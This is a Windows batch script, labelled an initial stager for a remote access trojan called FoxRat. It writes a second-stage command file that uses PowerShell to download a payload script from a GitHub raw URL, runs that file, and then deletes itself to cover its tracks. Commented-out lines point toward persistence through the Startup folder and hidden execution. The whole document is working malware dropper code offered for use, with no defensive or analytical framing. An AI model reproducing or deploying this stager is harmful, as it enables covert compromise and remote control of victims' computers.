@echo off
@REM initial stager for RAT
@REM created by: Dev Mukherjee

set "INITIALPATH=%cd%"
set STARTUP="C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM Writing on Startup
@REM cd %STARTUP%
(
echo powershell "Invoke-WebRequest -Uri raw.githubusercontent.com/dev-mukherjee/FoxRat/blob/main/Resources/payload.ps1 -OutFile ke.ps1" 
) > stage2.cmd
@REM powershell Start-Process CMD.exe -windowstyle hidden "%STARTUP%/stage2.cmd"
powershell ./stage2.cmd

@REM Returning Back to Initial Directory
cd "%INITIALPATH%"
del initial.cmd